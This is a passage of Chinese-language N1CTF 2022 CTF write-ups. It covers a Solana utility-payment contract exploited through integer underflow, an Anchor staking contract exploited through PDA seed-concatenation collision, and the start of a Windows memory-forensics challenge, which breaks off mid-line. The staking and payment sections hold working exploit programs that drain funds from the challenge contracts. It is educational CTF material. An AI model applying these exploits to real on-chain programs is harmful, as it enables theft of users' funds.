\u68c0\u67e5\u76ee\u6807\uff0c\u8fbe\u5230\u5219\u4e0b\u53d1 flag\uff1a let balance = challenge . env . get_account ( user . pubkey ()). unwrap (). lamports ; writeln! ( socket , \"user lamport after: {:?}\" , balance ) ? ; if balance > TARGET_AMT { let flag = fs :: read_to_string ( \"flag.txt\" ). unwrap (); writeln! ( socket , \"Flag: {}\" , flag ) ? ; } \u53ef\u89c1\u76ee\u6807\u662f\u4f7f user \u62e5\u6709\u7684 lamports \u5927\u4e8e 60000 lamports \u8fd9\u6837\u6211\u4eec\u7684\u653b\u51fb\u65b9\u5f0f\u5c31\u5f88\u660e\u663e\u4e86\uff1a \u5148\u8c03\u7528\u9898\u76ee\u5408\u7ea6\u7684 Init \u6307\u4ee4\u5b8c\u6210\u521d\u59cb\u5316\uff08\u9898\u76ee\u5df2\u7ecf\u5199\u597d\uff09 \u518d deposit 11 lamports\uff0c\u4f7f\u7528\u6237\u5bf9\u5e94\u7684 escrow \u7684 amount \u8bb0\u4e3a 11 \u7136\u540e pay 11 lamports\uff0c\u8fd9\u65f6\u4e0d\u4f1a\u6536\u53d6 11 lamports \u800c\u662f\u6536\u53d6\u57fa\u7840\u8d39\u7528 15 lamports\u3002escrow \u7684 amount \u4ece 11 \u51cf\u53bb 15 \u53d1\u751f\u6ea2\u51fa\uff0c\u6ea2\u51fa\u5230 65531\uff0c\u6b64\u65f6 withdraw \u7684\u8bdd reserve \u6709 1000000 \u8db3\u591f\u652f\u4ed8\uff0c\u63d0\u51fa\u6765\u540e\u4e5f\u53ef\u4ee5\u8fbe\u5230\u9898\u76ee 60000 \u7684\u76ee\u6807 \u76f4\u63a5 withdraw \u5373\u53ef \u6240\u4ee5\u53ea\u9700\u8981\u5c06\u8fd9\u4e9b\u6b65\u9aa4\u90fd\u7167\u846b\u82a6\u753b\u74e2\u5199\u5728 processor.rs \u7684 process_instruction \u4e2d\u5373\u53ef\uff1a exp \u5408\u7ea6 pub fn process_instruction ( _program : & Pubkey , accounts : & [ AccountInfo ], _data : & [ u8 ], ) -> ProgramResult { let account_iter = & mut accounts . iter (); let utility_program = next_account_info ( account_iter ) ? ; let user = next_account_info ( account_iter ) ? ; let reserve = next_account_info ( account_iter ) ? ; let escrow_account = next_account_info ( account_iter ) ? ; let sys_prog_account = next_account_info ( account_iter ) ? ; invoke ( & Instruction { program_id : * utility_program . key , accounts : vec ! [ AccountMeta :: new ( * user . key , true ), AccountMeta :: new ( * reserve . key , false ), AccountMeta :: new ( * escrow_account . key , false ), AccountMeta :: new_readonly ( system_program :: id (), false ), ], data : ServiceInstruction :: Init { } . try_to_vec () . unwrap (), }, & [ reserve . clone (), escrow_account . clone (), user . clone (), sys_prog_account . clone (), ], ) ? ; invoke ( & deposit_escrow ( * utility_program . key , * user . key , * reserve . key , * escrow_account . key , 11 , ), & [ reserve . clone (), escrow_account . clone (), user . clone (), sys_prog_account . clone (), ], ) ? ; invoke ( & pay_utility_fees ( * utility_program . key , * user . key , * reserve . key , * escrow_account . key , 11 , ), & [ reserve . clone (), escrow_account . clone (), user . clone (), sys_prog_account . clone (), ], ) ? ; invoke ( & withdraw_escrow ( * utility_program . key , * user . key , * reserve . key , * escrow_account . key , ), & [ reserve . clone (), escrow_account . clone (), user . clone (), sys_prog_account . clone (), ], ) ? ; Ok (()) } \u4e4b\u540e\u5229\u7528 cargo build-bpf\uff08\u9700\u8981\u5148\u5b89\u88c5 solana\uff09\u7f16\u8bd1\u51fa .so \u6587\u4ef6\uff0c\u518d\u4ea4\u7ed9 solve.py \u811a\u672c\u4ea4\u9898\u5373\u53ef\u3002 flag: n1ctf{cashback_\u2026\u2026}","title":"Utility Payment Service"},{"location":"writeups/n1ctf2022/#simple-staking","text":"\u540c\u6837\u4e5f\u662f solana \u5408\u7ea6\uff0c\u4e0d\u8fc7\u7528\u4e86 anchor lang\uff1a https://www.anchor-lang.com/ \uff0c\u6709\u5f88\u591a\u5947\u5947\u602a\u602a\u7684\u5199\u6cd5\uff0c\u4f46\u770b\u770b\u6587\u6863\u8fd8\u633a\u597d\u61c2\u7684 \u8fd8\u662f\u8be6\u7ec6\u89e3\u6790\u4e00\u4e0b\uff1a","title":"Simple Staking"},{"location":"writeups/n1ctf2022/#_1","text":"anchor lang \u7684\u8bed\u6cd5\u770b\u8d77\u6765\u5c31\u662f\u628a\u5904\u7406\u51fd\u6570\u5c01\u88c5\u5728\u4e00\u4e2a mod \u4e2d\u7136\u540e\u7528 #[program] \u5b8f\u6765\u5904\u7406\u3002 \u8fd9\u4e2a mod \u4e2d\u7684\u6bcf\u4e2a\u51fd\u6570\u90fd\u4f1a\u88ab\u5904\u7406\u6210\u4e00\u4e2a\u6307\u4ee4\uff0c\u5b83\u4eec\u7b2c\u4e00\u4e2a\u53c2\u6570\u90fd\u662f\u4e00\u4e2a Context \u6cdb\u578b\uff0c\u5176\u4f9d\u8d56\u7684\u662f\u9488\u5bf9\u6bcf\u79cd\u6307\u4ee4\u7684\u7ed3\u6784\u4f53 Accounts\uff08\u5373 Context \uff09\uff0c\u7136\u540e\u5728\u51fd\u6570\u5185\u90e8\u53ef\u4ee5\u5229\u7528 ctx.accounts.? \u6765\u83b7\u53d6\u5bf9\u5e94\u7ed3\u6784\u4f53\u4e2d\u7684\u5404\u4e2a account\u3002 \u7ed3\u6784\u4f53\u7684\u5b9a\u4e49\u4f1a\u4f7f\u7528 #[derive(Accounts)] \u5b8f\u6765\u8fdb\u884c\u5904\u7406\u3002\u5176\u4e2d\u6210\u5458\u4e5f\u53ef\u4ee5\u4f7f\u7528 #[account()] \u5b8f\u8fdb\u884c\u9650\u5b9a\uff0c\u5982\u679c\u8f93\u5165\u4e0d\u6ee1\u8db3\u9650\u5b9a\u5219\u4f1a\u62a5\u9519\uff0c\u5177\u4f53\u5199\u6cd5\u548c\u610f\u4e49\u53ef\u4ee5\u770b\u5b98\u65b9\u6587\u6863\u3002","title":"\u9898\u76ee\u5408\u7ea6"},{"location":"writeups/n1ctf2022/#initialize","text":"\u5904\u7406\u51fd\u6570\u662f\u7a7a\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u6240\u6709\u64cd\u4f5c\u90fd\u5728 Initialize \u7ed3\u6784\u4f53\u4e2d\u8fdb\u884c pub fn initialize ( _ctx : Context < Initialize > ) -> Result < () > { Ok (()) } Initialize \u7ed3\u6784\u4f53\u5b57\u6bb5\uff1a catalog\uff1a #[account( init, seeds = [ b \"CATALOG\" ], bump, payer = payer, space = Catalog::SIZE, )] pub catalog : Account <' info , Catalog > , init \u8868\u793a\u8fd9\u4e2a account \u9700\u8981\u521d\u59cb\u5316\uff08\u800c\u4e14\u4e0d\u80fd\u91cd\u590d\u8fdb\u884c\uff09 seeds \u8868\u793a\u7528\u8fd9\u4e2a seed \u6765\u627e PDA bump \u8868\u793a\u8981\u8bb0\u5f55\u4e0b canonical bump\uff08\u53ef\u4ee5\u901a\u8fc7 * ctx . bumps . get ( \"catalog\" ). unwrap () \u6765\u83b7\u53d6\u8fd9\u4e2a bump payer \u8868\u793a\u521b\u5efa\u8d26\u53f7\u8981\u7528\u7684 payer space \u7528\u6765\u786e\u5b9a\u5927\u5c0f\uff0c\u7531 Catalog \u89c4\u5b9a \u8fd9\u4e2a\u8d26\u6237\u5b58\u7684\u4fe1\u606f\uff08data\uff09\u662f Catalog \u7ed3\u6784\u4f53\u7684\u5185\u5bb9\uff08\u5e8f\u5217\u5316\u540e\uff09Catalog \u5b9a\u4e49\uff1a #[account] #[repr(C, align(8))] #[derive(Default)] pub struct Catalog { pub orgs : Vec < String > , pub ids : Vec < String > , } impl Catalog { pub const SIZE : usize = 8 + 4 + ( 4 + MAXIMUM_STRING_SIZE ) * MAXIMUM_CATALOG_SIZE // orgs: Vec<String>, + 4 + ( 4 + MAXIMUM_STRING_SIZE ) * MAXIMUM_CATALOG_SIZE ; // ids: Vec<String>, } reserve\uff1a #[account( init, seeds = [ b \"RESERVE\" ], bump, payer = payer, token::mint = mint, token::authority = reserve )] pub reserve : Account <' info , TokenAccount > , \u4e0e\u524d\u9762\u540c\u7406 \u8fd9\u662f\u4e00\u4e2a TokenAccount\uff0c\u5176\u5b9a\u4e49\u5728 spl_token \u4e2d\uff0c\u662f\u4e00\u4e2a\u7c7b\u4f3c ERC20 \u7684\u4ee3\u5e01 \u5176\u5b83\uff1a pub mint : Account <' info , Mint > , #[account(mut)] pub payer : Signer <' info > , pub token_program : Program <' info , Token > , pub system_program : Program <' info , System > , pub rent : Sysvar <' info , Rent > , mint \u4e3a Token \u5408\u7ea6\u7684 mint \u8d26\u6237\uff0c\u7528\u6765\u7ed9 reserve \u63d0\u4f9b\u53c2\u6570 token::mint payer \u4e5f\u662f\u4e3a\u524d\u9762\u4e24\u4e2a\u63d0\u4f9b\u53c2\u6570 token_program \u662f spl token \u7684 ID system_program \u662f\u9898\u76ee\u5408\u7ea6\u7684 ID rent \u662f solana \u7cfb\u7edf\u7684 rent ID\uff08\u4e0d\u7528\u7ba1\u8fd9\u4e2a\uff09","title":"Initialize"},{"location":"writeups/n1ctf2022/#register","text":"Register \u7ed3\u6784\u4f53\uff1a catalog\uff1a #[account( mut, seeds = [ b \"CATALOG\" ], bump )] pub catalog : Account <' info , Catalog > , \u6839\u636e\u8fd9\u4e2a seed \u6765\u83b7\u53d6\uff0c\u540c\u6837\u8bb0\u5f55 bump employee_record\uff1a #[account( init, seeds = [user.key().as_ref()], bump, payer = user, space = EmployeeRecord::SIZE, )] pub employee_record : Account <' info , EmployeeRecord > , \u548c\u524d\u9762 Initialize \u7684\u540c\u7406 \u5176\u4e2d EmployeeRecord \u7ed3\u6784\u4f53\uff1a #[account] #[repr(C, align(8))] #[derive(Default)] pub struct EmployeeRecord { pub org : String , pub id : String , pub key : Pubkey , } impl EmployeeRecord { pub const SIZE : usize = 8 + 4 + MAXIMUM_STRING_SIZE // orgs: String, + 4 + MAXIMUM_STRING_SIZE // ids: String, + 32 ; // key: Pubkey } \u5176\u5b83\uff1a #[account(mut)] pub user : Signer <' info > , pub system_program : Program <' info , System > , pub rent : Sysvar <' info , Rent > , \u5904\u7406\u51fd\u6570\uff1a pub fn register ( ctx : Context < Register > , org_name : String , employee_id : String ) -> Result < () > { msg ! ( \"[CHALL] register: org {}, id {}\" , org_name , employee_id ); require ! ( org_name . len () < MAXIMUM_STRING_SIZE , CoreError :: StringTooLong ); require ! ( employee_id . len () < MAXIMUM_STRING_SIZE , CoreError :: StringTooLong ); let catalog = & mut ctx . accounts . catalog ; require ! ( ! ( catalog . orgs . contains ( & org_name ) && catalog . ids . contains ( & employee_id ) ), CoreError :: DuplicatedEmployee ); catalog . orgs . push ( org_name . clone ()); catalog . ids . push ( employee_id . clone ()); let employee_record = & mut ctx . accounts . employee_record ; let employee_key = ctx . accounts . user . key (); employee_record . org = org_name ; employee_record . id = employee_id ; employee_record . key = employee_key ; Ok (()) } \u9996\u5148\u9a8c\u8bc1 org_name \u548c employee_id \u7684\u957f\u5ea6 \u68c0\u67e5 (org_name, employee_id) \u662f\u5426\u5728 catalog \u4e2d\u5b58\u5728\uff0c\u5b58\u5728\u5219\u62a5\u9519 \u5c06 (org_name, employee_id) \u6dfb\u52a0\u5230 catalog \u4e2d \u4fee\u6539 employee_record","title":"Register"},{"location":"writeups/n1ctf2022/#deposit","text":"Deposit \u7ed3\u6784\u4f53 vault\uff1a #[account( init_if_needed, seeds = [org_name.as_bytes(), employee_id.as_bytes()], bump, space = Vault::SIZE, payer = user )] pub vault : Account <' info , Vault > , \u901a\u8fc7 [org_name, employee_id] \u8fd9\u4e2a seed \u83b7\u53d6 PDA Vault \u5b9a\u4e49\uff1a #[account] #[repr(C, align(8))] #[derive(Default)] pub struct Vault { pub amount : u64 , } impl Vault { pub const SIZE : usize = 8 // DISCRIMINATOR_SIZE + 8 ; // u64 } employee_record\uff1a #[account( seeds = [user.key().as_ref()], bump, constraint = employee_record.org == org_name, constraint = employee_record.id == employee_id, constraint = employee_record.key == user.key(), )] pub employee_record : Account <' info , EmployeeRecord > , \u8fd9\u91cc\u6709\u65b0\u51fa\u73b0\u7684 constraint\uff0c\u4f20\u53c2\u65f6\u4f1a\u68c0\u67e5\u5176\u5185\u5bb9\u662f\u5426\u4e3a true\uff0c\u4e0d\u662f\u7684\u8bdd\u5c31\u62a5\u9519\u7136\u540e revert \u5176\u5b83 #[account( mut, seeds = [ b \"RESERVE\" ], bump, constraint = reserve.mint == mint.key(), )] pub reserve : Account <' info , TokenAccount > , #[account( mut, constraint = user_token_account.owner == user.key(), constraint = user_token_account.mint == mint.key() )] pub user_token_account : Account <' info , TokenAccount > , pub mint : Account <' info , Mint > , #[account(mut)] pub user : Signer <' info > , pub token_program : Program <' info , Token > , pub system_program : Program <' info , System > , pub rent : Sysvar <' info , Rent > , \u5904\u7406\u51fd\u6570\uff1a pub fn deposit ( ctx : Context < Deposit > , org_name : String , employee_id : String , amount : u64 ) -> Result < () > { msg ! ( \"[CHALL] deposit\" ); let vault = & mut ctx . accounts . vault ; let employee_record = & ctx . accounts . employee_record ; let user = & ctx . accounts . user ; require ! ( user . key () == employee_record . key && org_name == employee_record . org && employee_id == employee_record . id , CoreError :: UnknownEmployee ); let deposit_ctx = CpiContext :: new ( ctx . accounts . token_program . to_account_info (), Transfer { from : ctx . accounts . user_token_account . to_account_info (), to : ctx . accounts . reserve . to_account_info (), authority : ctx . accounts . user . to_account_info () } ); token :: transfer ( deposit_ctx , amount ) ? ; vault . amount += amount ; Ok (()) } \u5148\u8bd5\u4e00\u7cfb\u5217\u68c0\u67e5\uff0c\u68c0\u67e5\u8f93\u5165\u662f\u5426\u5408\u6cd5 \u7136\u540e\u8c03\u7528 spl token \u7684 transfer \u6307\u4ee4\u6765\u4ece user_token_account \u8f6c amount \u4e2a token \u7ed9 reserve \u4e3a vault \u7684 amount \u589e\u52a0 amount\uff08\u8fd9\u4e2a vault \u662f\u6839\u636e seed [org_name, employee_id] \u627e\u5230\u7684 PDA\uff09","title":"Deposit"},{"location":"writeups/n1ctf2022/#withdraw","text":"Withdraw \u7ed3\u6784\u4f53 \u5176\u5185\u5bb9\u548c Deposit \u51e0\u4e4e\u4e00\u81f4 \u533a\u522b\u5728\u4e8e Deposit \u7684 user \u5728\u8fd9\u91cc\u53eb\u505a payer\uff0c\u4e0d\u8fc7\u7528\u5904\u5e94\u8be5\u6ca1\u53d8 \u5904\u7406\u51fd\u6570\uff1a pub fn withdraw ( ctx : Context < Withdraw > , org_name : String , employee_id : String , amount : u64 ) -> Result < () > { msg ! ( \"[CHALL] withdraw\" ); let vault = & mut ctx . accounts . vault ; let employee_record = & ctx . accounts . employee_record ; let payer = ctx . accounts . payer . key (); require ! ( payer == employee_record . key && org_name == employee_record . org && employee_id == employee_record . id , CoreError :: UnknownEmployee ); require ! ( vault . amount >= amount , CoreError :: InsufficientBalance ); let reserve_bump = [ * ctx . bumps . get ( \"reserve\" ). unwrap ()]; let signer_seeds = [ b\"RESERVE\" , reserve_bump . as_ref () ]; let signer = & [ & signer_seeds [ .. ]]; let withdraw_ctx = CpiContext :: new_with_signer ( ctx . accounts . token_program . to_account_info (), Transfer { from : ctx . accounts . reserve . to_account_info (), to : ctx . accounts . user_account . to_account_info (), authority : ctx . accounts . reserve . to_account_info () }, signer ); token :: transfer ( withdraw_ctx , amount ) ? ; vault . amount -= amount ; Ok (()) } \u540c\u6837\u505a\u4e86\u5f88\u591a\u68c0\u67e5 \u5229\u7528 spl token \u5408\u7ea6\u4ece reserve transfer amount token \u7ed9 user_account \u7ed9 vault.amount \u51cf\u5c11 amount","title":"Withdraw"},{"location":"writeups/n1ctf2022/#_2","text":"\u9898\u76ee\u4ea4\u4e92\u4ee3\u7801 async fn handle_connection ( mut socket : TcpStream ) -> Result < (), Box < dyn Error >> { let mut builder = ChallengeBuilder :: try_from ( socket . try_clone (). unwrap ()). unwrap (); let chall_id = builder . add_program ( \"./chall/target/deploy/chall.so\" , Some ( chall :: ID )); let solve_id = builder . input_program () ? ; let mut chall = builder . build (). await ; // ------------------------------------------------------------------------- // [setup env] initialize // ------------------------------------------------------------------------- let program_id = chall_id ; let mint = chall . add_mint (). await ? ; let payer_keypair = & chall . ctx . payer ; let payer = payer_keypair . pubkey (); let user_keypair = Keypair :: new (); let user = user_keypair . pubkey (); chall . run_ix ( system_instruction :: transfer ( & payer , & user , 100_000_000_000 )) . await ? ; let catalog = Pubkey :: find_program_address ( & [ b\"CATALOG\" ], & program_id ). 0 ; let reserve = Pubkey :: find_program_address ( & [ b\"RESERVE\" ], & program_id ). 0 ; println! ( \" \\n Accounts created... \\n \" ); let ix = chall :: instruction :: Initialize {}; let ix_accounts = chall :: accounts :: Initialize { catalog , reserve , mint , payer , token_program : spl_token :: ID , system_program : solana_program :: system_program :: ID , rent : solana_program :: sysvar :: rent :: ID , }; chall . run_ix ( Instruction :: new_with_bytes ( program_id , & ix . data (), ix_accounts . to_account_metas ( None ), )) . await ? ; // ------------------------------------------------------------------------- // [setup env] register // ------------------------------------------------------------------------- let org_name = String :: from ( \"product\" ); let employee_id = String :: from ( \"employ_A\" ); let ix = chall :: instruction :: Register { org_name : org_name . clone (), employee_id : employee_id . clone (), }; let employee_record = Pubkey :: find_program_address ( & [ payer . as_ref ()], & program_id ). 0 ; let reg_accounts = chall :: accounts :: Register { catalog , employee_record , user : payer , system_program : solana_program :: system_program :: ID , rent : solana_program :: sysvar :: rent :: ID , }; chall . run_ix ( Instruction :: new_with_bytes ( program_id , & ix . data (), reg_accounts . to_account_metas ( None ), )) . await ? ; // ------------------------------------------------------------------------- // [setup env] deposits 1_000 // ------------------------------------------------------------------------- let payer_token_account = chall . add_token_account ( & mint , & payer ). await ? ; chall . mint_to ( 1_000_ u64 , & mint , & payer_token_account ) . await ? ; let vault = Pubkey :: find_program_address ( & [ org_name . clone (). as_bytes (), employee_id . clone (). as_bytes ()], & program_id , ) . 0 ; let ix = chall :: instruction :: Deposit { org_name : org_name . clone (), employee_id : employee_id . clone (), amount : 500_ u64 , }; let ix_accounts = chall :: accounts :: Deposit { vault , employee_record , reserve , user_token_account : payer_token_account , mint , user : payer , token_program : spl_token :: ID , system_program : solana_program :: system_program :: ID , rent : solana_program :: sysvar :: rent :: ID , }; chall . run_ix ( Instruction :: new_with_bytes ( program_id , & ix . data (), ix_accounts . to_account_metas ( None ), )) . await ? ; // TDOD: comment out let reserve_account = chall . read_token_account ( reserve ). await ? ; let reserve_balance = reserve_account . amount ; println! ( \" \\n vault = {} \\n reserve balance = {} \\n \" , vault , reserve_balance ); // ---------------------------------------------------------------------------- // [setup env] done // ---------------------------------------------------------------------------- let init_amount = 100_ u64 ; let user_record = Pubkey :: find_program_address ( & [ user . as_ref ()], & program_id ). 0 ; let user_token_account_pubkey = chall . add_token_account ( & mint , & user ). await ? ; chall . mint_to ( init_amount , & mint , & user_token_account_pubkey ) . await ? ; writeln! ( socket , \"user: {}\" , user ) ? ; writeln! ( socket , \"user_record: {}\" , user_record ) ? ; writeln! ( socket , \"catalog: {}\" , catalog ) ? ; writeln! ( socket , \"mint: {}\" , mint ) ? ; writeln! ( socket , \"user_token_account: {}\" , user_token_account_pubkey ) ? ; writeln! ( socket , \"reserve: {}\" , reserve ) ? ; let bump_budget = ComputeBudgetInstruction :: request_units ( 10_000_000 u32 , 0 u32 ); let solve_ix = chall . read_instruction ( solve_id ) ? ; chall . run_ixs_full ( & [ bump_budget , solve_ix ], & [ & user_keypair ], & user_keypair . pubkey (), ) . await ? ; let user_token_account = chall . read_token_account ( user_token_account_pubkey ). await ? ; writeln! ( socket , \"player_account_amount: {:?}\" , user_token_account . amount ) ? ; println! ( \" \\n player_account_amount balance = {} \\n \" , user_token_account . amount ); if user_token_account . amount > init_amount { writeln! ( socket , \"congrats!\" ) ? ; if let Ok ( flag ) = env :: var ( \"FLAG\" ) { writeln! ( socket , \"flag: {:?}\" , flag ) ? ; } else { writeln! ( socket , \"flag not found, please contact admin\" ) ? ; } } Ok (()) } \u8bfb\u53d6\u9898\u76ee\u5408\u7ea6\u548c\u7528\u6237\u8f93\u5165\u5408\u7ea6 \u589e\u52a0 mint\u3001payer\u3001user \u8d26\u6237 \u521d\u59cb\u7ed9 user 100_000_000_000 lamports \u83b7\u53d6\u5c5e\u4e8e\u9898\u76ee\u5408\u7ea6\u7684 catalog \u548c reserve PDA \u8c03\u7528\u9898\u76ee\u5408\u7ea6\u7684 Initialize \u6307\u4ee4 \u8c03\u7528 Register\uff0corg_name \u548c employee_id \u4e3a (\"product\", \"employ_A\") \u521b\u5efa payer_token_account\uff0c\u521d\u59cb\u7ed9\u5176 1000 token \u83b7\u53d6 seed (\"product\", \"employ_A\") \u7684 PDA \u4f5c\u4e3a vault\uff0c\u8c03\u7528 Deposit\uff0camount \u4e3a 500 token \u521b\u5efa user_record \u548c user_token_account\uff0c\u5411\u5176\u4e2d\u521d\u59cb\u8f6c 100 token \u8f93\u51fa\u4e00\u7cfb\u5217 pubkey \u8bfb\u53d6\u6307\u4ee4\uff0c\u8c03\u7528\u7528\u6237\u5408\u7ea6 \u83b7\u53d6 user_token_account \u7684 token \u4e2a\u6570\uff0c\u5982\u679c\u591a\u4e8e 100 \u4e2a\u5219\u8f93\u51fa flag","title":"\u9898\u76ee\u4ea4\u4e92\u90e8\u5206"},{"location":"writeups/n1ctf2022/#_3","text":"\u8fd9\u9898\u7684\u7b54\u9898\u4ea4\u4e92\u4e5f\u7ed9\u4e86\uff0c\u662f rust \u4ee3\u7801\uff0c\u5199\u597d\u4e86\u76f4\u63a5\u6539\u4e0b tcp \u5730\u5740\u7136\u540e cargo run \u5c31\u53ef\u4ee5\u6253\u4e86\u3002 \u4e3b\u8981\u7684\u89e3\u6cd5\u8fd8\u662f\u5728 solve/programs/solve/src/lib.rs \u4e2d\u7f16\u5199\u3002 \u9898\u7ed9\u4e86\u4e00\u4e2a\u521d\u59cb\u5316\u6307\u4ee4\u548c\u5176\u7ed3\u6784\u4f53\u7684\u5b9a\u4e49\uff0c\u5728\u91cc\u9762\u8865\u5145\u5c31\u53ef\u4ee5\u3002\u539f\u6709\u7684\u662f\u4e00\u4e2a\u8c03\u7528 Register \u7684\u4ee3\u7801\uff0cregister \u4e86 (\"product\", \"employ_B\") \u8fd9\u4e2a record\u3002 \u627e\u4e86\u5f88\u957f\u65f6\u95f4\u6ca1\u770b\u51fa\u6f0f\u6d1e\u5728\u54ea\u3002\u4f46 solana \u7684\u5b98\u65b9\u6587\u6863\u4e2d \u5173\u4e8e PDA seed \u7684\u63cf\u8ff0 \u91cc\u9762\u6709\u4e00\u4e2a warning\uff1a Warning: Because of the way the seeds are hashed there is a potential for program address collisions for the same program id. The seeds are hashed sequentially which means that seeds {\"abcdef\"}, {\"abc\", \"def\"}, and {\"ab\", \"cd\", \"ef\"} will all result in the same program address given the same program id. Since the chance of collision is local to a given program id, the developer of that program must take care to choose seeds that do not collide with each other. For seed schemes that are susceptible to this type of hash collision, a common remedy is to insert separators between seeds, e.g. transforming {\"abc\", \"def\"} into {\"abc\", \"-\", \"def\"}. \u5927\u4f53\u610f\u601d\u5c31\u662f\uff0c\u5982\u679c seed \u6709\u591a\u4e2a\u7684\u8bdd\uff0c\u8ba1\u7b97\u7684\u65f6\u5019\u662f\u76f4\u63a5\u62fc\u63a5\u8d77\u6765\u7684\uff0c[\"abcdef\"] \u548c [\"abc\", \"def\"]\u3001[\"ab\", \"cdef\"] \u7b97\u51fa\u6765\u7684 PDA \u662f\u4e00\u6837\u7684\u3002 \u800c\u9898\u76ee\u4e2d\u83b7\u53d6 vault \u7528\u7684 seed \u662f [org_name, employee_id]\uff0c\u8fd9\u91cc\u5c31\u5b58\u5728\u4e86\u62fc\u63a5\u3002\u65e2\u7136\u6211\u4eec\u4e0d\u80fd\u4f7f\u7528\u540c\u6837\u7684 (org_name, employee_id) \u6765\u6ce8\u518c\u3001\u83b7\u53d6\u5230\u5176\u8bb0\u5f55\u6709 500 token \u7684 vault\uff0c\u4f46\u6211\u4eec\u53ef\u4ee5\u7528\u53e6\u4e00\u5bf9 (org_name, employee_id) \u6765\u5b8c\u6210\u6ce8\u518c\u3001\u5e76\u5728 withdraw \u83b7\u53d6 vault \u7684\u65f6\u5019\u4f7f\u5176\u62fc\u63a5\u8d77\u6765\u548c\u9898\u76ee\u4e2d\u7684\u4e00\u6837\u6765\u83b7\u53d6\u5230\u90a3\u4e2a 500 token \u7684 vault\u3002 \u6240\u4ee5\u6211\u4eec\u6ce8\u518c\u4e00\u4e2a (\"produc\", \"temploy_A\") \u7136\u540e\u76f4\u63a5 withdraw \u5c31\u53ef\u4ee5\u4e86\uff1a exp \u5408\u7ea6 initialize \u6307\u4ee4 pub fn initialize ( ctx : Context < Initialize > ) -> Result < () > { let o1 = String :: from ( \"produc\" ); let e1 = String :: from ( \"temploy_A\" ); let cpi_accounts = chall :: cpi :: accounts :: Register { catalog : ctx . accounts . catalog . to_account_info (), employee_record : ctx . accounts . user_record . to_account_info (), user : ctx . accounts . user . to_account_info (), system_program : ctx . accounts . system_program . to_account_info (), rent : ctx . accounts . rent . to_account_info (), }; let cpi_ctx = CpiContext :: new ( ctx . accounts . chall . to_account_info (), cpi_accounts ); chall :: cpi :: register ( cpi_ctx , o1 , e1 ) ? ; let o1 = String :: from ( \"produc\" ); let e1 = String :: from ( \"temploy_A\" ); let cpi_accounts = chall :: cpi :: accounts :: Withdraw { vault : ctx . accounts . vault . to_account_info (), employee_record : ctx . accounts . user_record . to_account_info (), reserve : ctx . accounts . reserve . to_account_info (), user_account : ctx . accounts . user_token_account . to_account_info (), mint : ctx . accounts . mint . to_account_info (), payer : ctx . accounts . user . to_account_info (), token_program : ctx . accounts . token_program . to_account_info (), system_program : ctx . accounts . system_program . to_account_info (), rent : ctx . accounts . rent . to_account_info (), }; let cpi_ctx = CpiContext :: new ( ctx . accounts . chall . to_account_info (), cpi_accounts ); chall :: cpi :: withdraw ( cpi_ctx , o1 , e1 , 1 ) ? ; Ok (()) } \u7136\u540e\u4ea4\u4e92\u7684 main.rs \u4e2d\u8fd8\u6709\u4e00\u5904\u83b7\u53d6\u53c2\u6570 vault \u7684\u5730\u65b9\u4e5f\u9700\u8981\u6539\u4e00\u4e0b\uff1a let vault = Pubkey :: find_program_address ( & [ b\"produc\" , b\"temploy_A\" ], & chall_id , ). 0 ; \u5176\u5b83\u6cbf\u7528\u7ed9\u7684\u4ea4\u4e92\u5c31\u53ef\u4ee5\u4e86\u3002\u8fd9\u6837 main.rs \u4e2d\u8f93\u5165\u6307\u4ee4\uff0c\u8c03\u7528 exp \u5408\u7ea6\u7684 Initialize \u6307\u4ee4\uff0c\u5176\u4e2d withdraw \u4e86\uff0c\u7ed3\u675f\u540e\u68c0\u67e5 token amount \u5c31\u4f1a\u6bd4\u539f\u5148\u66f4\u591a\u4e86\u3002 flag: n1ctf{I_sh0uld_h4ve_ch0s3n_4_b3tt3r_se3d_de5ign}","title":"\u505a\u6cd5"},{"location":"writeups/n1ctf2022/#just-find-flag","text":"\u4e00\u9053 Windows \u5185\u5b58\u53d6\u8bc1\u9898\uff0c\u5dee\u4e86\u4e00\u6b65\u6ca1\u505a\u51fa\u6765\u3002\u7ed3\u675f\u540e\u8865\u5b8c\u4e86\u3002 \u5185\u5b58\u53d6\u8bc1\u76f4\u63a5\u4e0a\u624b\u5148 strings \u4e00\u628a\u68ad\uff0c\u53d1\u73b0\u4e86 flag.zip\u3001flag.txt\u3002\u662f\u4e00\u4e2a\u538b\u7f29\u5305\uff0c\u76f4\u63a5\u4ece\u5341\u516d\u8fdb\u5236\u91cc\u628a\u5b83\u5b8c\u6574\u5185\u5bb9\u6252\u51fa\u6765\uff0c\u53d1\u73b0\u6709\u5bc6\u7801\uff0c\u800c\u4e14\u662f\u771f\u5bc6\u7801\uff0c\u516d\u4f4d\u6570\u5bc6\u7801\u7206\u4e0d\u51fa\u6765\u3002 \u7ee7\u7eed volatility \u4e00\u628a\u68ad\uff0cimageinfo \u51fa\u6765\u662f Win7 \u7cfb\u7edf\uff0c\u4e00\u4e9b\u6ca1\u7528\u7684\u6307\u4ee4\u8f93\u51fa\u5c31\u4e0d\u5728\u8fd9\u91cc\u5199\u4e86 \u5728\u6267\u884c consoles \u6307\u4ee4\u7684\u65f6\u5019\u53d1\u73b0\u4e86\uff1a ************************************************** ConsoleProcess: conhost.exe Pid: 2480 Console: 0xff656200 CommandHistorySize: 50 HistoryBufferCount: 2 HistoryBufferMax: 4 OriginalTitle: %SystemRoot%\\system32\\cmd.exe Title: C:\\Windows\\system32\\cmd.exe - C:\\Python27\\python.exe -m SimpleHTTPServer AttachedProcess: python.exe Pid: 2052 Handle: 0x8c AttachedProcess: cmd.exe Pid: 2336 Handle: 0x60 ---- CommandHistory: 0x37ed10 Application: python.exe Flags: Allocated CommandCount: 0 LastAdded: -1 LastDisplayed: -1 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x8c ---- CommandHistory: 0x37e9c0 Application: cmd.exe Flags: Allocated, Reset CommandCount: 3 LastAdded: 2 LastDisplayed: 2 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x60 Cmd #0 at 0x382d60: echo \"Stucked? You can ask WallPaper god for help.\" Cmd #1 at 0x35e3a0: cd Desktop Cmd #2 at 0x382dd0: C:\\Python27\\python.exe -m SimpleHTTPServer ---- Screen 0x360f70 X:80 Y:300 Dump: Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Users\\dora>echo \"Stucked? You can ask WallPaper god for help.\" \"Stucked? You can ask WallPaper god for help.\" C:\\Users\\dora>cd Desktop C:\\Users\\dora\\Desktop>C:\\Python27\\python.exe -m 